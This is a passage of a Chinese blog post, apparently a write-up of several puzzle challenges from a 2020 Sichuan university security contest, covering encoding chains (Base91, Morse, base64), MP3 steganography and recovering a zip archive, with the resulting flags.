&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223312262-473349276.png&#34;
	width=&#34;397&#34;
	height=&#34;84&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223312262-473349276_hu2932611120786829101.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223312262-473349276_hu2662920279769580034.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;472&#34;
		data-flex-basis=&#34;1134px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我直接就把这个交了，结果不对，从希望的边缘掉了下去。&lt;/p&gt;
&lt;p&gt;冷静了一下，这个如果是flag格式，球员衣服数字是时间轴，那么是不是应该在你的名字电影里找找线索呢？&lt;/p&gt;
&lt;p&gt;然后就找到了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142801071-1003634076.png&#34;
	width=&#34;554&#34;
	height=&#34;312&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142801071-1003634076_hu7400227318654969312.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142801071-1003634076_hu16299395046390466119.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142810631-467160458.png&#34;
	width=&#34;554&#34;
	height=&#34;312&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142810631-467160458_hu3131688116954945180.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142810631-467160458_hu13093680157005757194.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142817059-1077779911.png&#34;
	width=&#34;554&#34;
	height=&#34;313&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142817059-1077779911_hu6586540411324461596.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142817059-1077779911_hu471233325227206957.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;176&#34;
		data-flex-basis=&#34;424px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142824025-194202023.png&#34;
	width=&#34;554&#34;
	height=&#34;312&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142824025-194202023_hu15488310295162130247.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142824025-194202023_hu2088656419290292778.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142836401-1091204569.png&#34;
	width=&#34;554&#34;
	height=&#34;312&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142836401-1091204569_hu5553015145787527792.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909142836401-1091204569_hu1617868741664535939.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;连起来就好了，注意大小写&lt;/p&gt;
&lt;h3 id=&#34;flag值-1&#34;&gt;flag值：
&lt;/h3&gt;&lt;h3 id=&#34;flag0725-2016-grandmenu-rchitecture-1335&#34;&gt;flag{0725-2016-GRANDMENU-RCHITECTURE-1335}
&lt;/h3&gt;&lt;h3 id=&#34;3-国王与小麦&#34;&gt;3 国王与小麦
&lt;/h3&gt;&lt;h3 id=&#34;操作内容-2&#34;&gt;操作内容：
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909143005163-1698602118.png&#34;
	width=&#34;554&#34;
	height=&#34;151&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909143005163-1698602118_hu17361150748567304213.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909143005163-1698602118_hu4091294582584746454.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;366&#34;
		data-flex-basis=&#34;880px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Base91加密，解密之后：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909143017215-1376531072.png&#34;
	width=&#34;554&#34;
	height=&#34;297&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909143017215-1376531072_hu17148886918784629668.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200909143017215-1376531072_hu4970510159281951434.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;得到一堆数字，考虑是摩斯密码，找个牛逼网站解密：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200910222159490-1434376006.png&#34;
	width=&#34;554&#34;
	height=&#34;237&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200910222159490-1434376006_hu8175925199687745237.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200910222159490-1434376006_hu5877184944442344928.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;233&#34;
		data-flex-basis=&#34;561px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;想想国王与小麦讲的故事，第一个格子放一袋米，第二个放前面一个格子的两倍，六十四个个子是放不完的。所以这些数字是2的各个次方！&lt;/p&gt;
&lt;p&gt;于是转换为：&lt;/p&gt;
&lt;p&gt;25,38,49,33,25,55,45,53, 12,23,12,49,23,51,5,51,23,55,13,47,28,53,60,49,25,22,
5,25,23,54,9,33,13,35,17,61&lt;/p&gt;
&lt;p&gt;显然这也不是flag，比赛最后十分钟的时候灵感爆发，觉得这些和base64的转换表有关系，于是手动转换：&lt;/p&gt;
&lt;p&gt;ZmxhZ3t1MXMxXzFzX3Nvc18xZWFZX2JhNjR9&lt;/p&gt;
&lt;p&gt;扔进在线网站：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223530008-608748964.png&#34;
	width=&#34;394&#34;
	height=&#34;249&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223530008-608748964_hu541586760085470809.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223530008-608748964_hu12261429055203574959.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;158&#34;
		data-flex-basis=&#34;379px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可真是有够刺激的。&lt;/p&gt;
&lt;h3 id=&#34;flag值-2&#34;&gt;flag值：
&lt;/h3&gt;&lt;p&gt;flag{u1s1_1s_sos_1eaY_ba64}&lt;/p&gt;
&lt;h3 id=&#34;4-yang&#34;&gt;4 yang
&lt;/h3&gt;&lt;h3 id=&#34;操作内容-3&#34;&gt;操作内容：
&lt;/h3&gt;&lt;p&gt;这个我感觉做到最后就差一步了，然鹅没做出来，就很可惜。&lt;/p&gt;
&lt;p&gt;这个歌曲是用MP3Stego写入内容了，那就用这个程序解密。&lt;/p&gt;
&lt;p&gt;然而解密需要密码，其实很简单，密码的问题已经写出来了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223530574-2101931936.png&#34;
	width=&#34;238&#34;
	height=&#34;173&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223530574-2101931936_hu6907229251833427928.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223530574-2101931936_hu5809765951556084810.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;137&#34;
		data-flex-basis=&#34;330px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在属性里，有个i-soon chengli time，也就是在问安洵公司成立的时间，百度可以知道是2015年3月31日，也就是20150331。&lt;/p&gt;
&lt;p&gt;然后我们去解密：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223531873-1977256982.png&#34;
	width=&#34;554&#34;
	height=&#34;149&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223531873-1977256982_hu16549599128058186236.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223531873-1977256982_hu5562464050690873264.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;371&#34;
		data-flex-basis=&#34;892px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223537304-982656963.png&#34;
	width=&#34;554&#34;
	height=&#34;390&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223537304-982656963_hu8213149800690390396.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223537304-982656963_hu2190522648547789250.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;142&#34;
		data-flex-basis=&#34;340px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;得到与佛论禅：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223538978-446374792.png&#34;
	width=&#34;554&#34;
	height=&#34;213&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223538978-446374792_hu8414522647850255261.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223538978-446374792_hu4697342963214690752.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;260&#34;
		data-flex-basis=&#34;624px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;一看是504B0304开头的，下意识感觉是个zip的压缩包数据，于是用16进制编辑器打开看看。这里折磨了半天，不知道怎么把十六进制导入，后来看着英文搞懂了，先复制好，然后再点这个：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223541214-12625370.png&#34;
	width=&#34;554&#34;
	height=&#34;447&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223541214-12625370_hu551938545622096268.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223541214-12625370_hu17092056057060138648.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;123&#34;
		data-flex-basis=&#34;297px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;就产生了zip的压缩包:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223542780-1040344603.png&#34;
	width=&#34;554&#34;
	height=&#34;356&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223542780-1040344603_hu5281220488319994003.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223542780-1040344603_hu15032714355159070488.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;155&#34;
		data-flex-basis=&#34;373px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这个包是真的加密不是伪加密，用爆破工具爆破开了，然而…&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223543561-402124339.png&#34;
	width=&#34;545&#34;
	height=&#34;108&#34;
